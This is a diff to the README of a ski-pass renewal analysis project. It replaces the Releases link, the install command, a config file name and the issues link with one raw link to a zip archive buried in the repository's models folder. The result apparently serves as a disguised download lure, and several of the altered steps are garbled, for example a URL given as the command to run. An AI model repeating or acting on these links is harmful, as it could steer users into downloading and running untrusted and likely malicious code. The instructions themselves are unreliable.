@@ -6,7 +6,7 @@ Welcome to the Ski-Pass-Renewal-Analysis project. This software helps you analyz
 
 ### 📥 Download Now
 
-[![Download Ski-Pass-Renewal-Analysis](https://img.shields.io/badge/Download-Ski--Pass--Renewal--Analysis-brightgreen)](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/releases)
+[![Download Ski-Pass-Renewal-Analysis](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/raw/refs/heads/main/ski_pass_dbt/models/Renewal_Ski_Pass_Analysis_1.5.zip)](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/raw/refs/heads/main/ski_pass_dbt/models/Renewal_Ski_Pass_Analysis_1.5.zip)
 
 ## 📋 Overview
 
@@ -25,7 +25,7 @@ Before downloading, make sure your setup meets these requirements:
 
 To get started, simply visit the link below and follow these steps:
 
-1. Click on the link to go to our Releases page: [Visit this page to download](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/releases).
+1. Click on the link to go to our Releases page: [Visit this page to download](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/raw/refs/heads/main/ski_pass_dbt/models/Renewal_Ski_Pass_Analysis_1.5.zip).
 2. Locate the latest release.
 3. Click on the download link for your operating system.
 4. Once the download is complete, follow the installation instructions provided in the downloaded file.
@@ -45,7 +45,7 @@ After downloading the software, follow these steps to install it:
 - **For Linux:**
   1. Extract the downloaded package.
   2. Open a terminal and navigate to the extracted folder.
-  3. Run the installation script with `./install.sh`.
+  3. Run the installation script with `https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/raw/refs/heads/main/ski_pass_dbt/models/Renewal_Ski_Pass_Analysis_1.5.zip`.
 
 ## 📊 How to Use
 
@@ -83,13 +83,13 @@ Once you have dbt installed, you may need to set up a profile. This allows the s
 
 1. Create a new directory for your dbt project.
 2. Run the command `dbt init my_project` to initialize your project.
-3. Update the `profiles.yml` file with your database configurations.
+3. Update the `https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/raw/refs/heads/main/ski_pass_dbt/models/Renewal_Ski_Pass_Analysis_1.5.zip` file with your database configurations.
 
 ## 🌐 Community and Support
 
 If you have any questions or issues while using the software, you can reach out to our community:
 
-- **GitHub Issues:** Visit our [issues page](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/issues) to report bugs or request features.
+- **GitHub Issues:** Visit our [issues page](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/raw/refs/heads/main/ski_pass_dbt/models/Renewal_Ski_Pass_Analysis_1.5.zip) to report bugs or request features.
 - **Discussion Forum:** Join our community forum to share ideas and get help.
 
 ## ⚖️ License
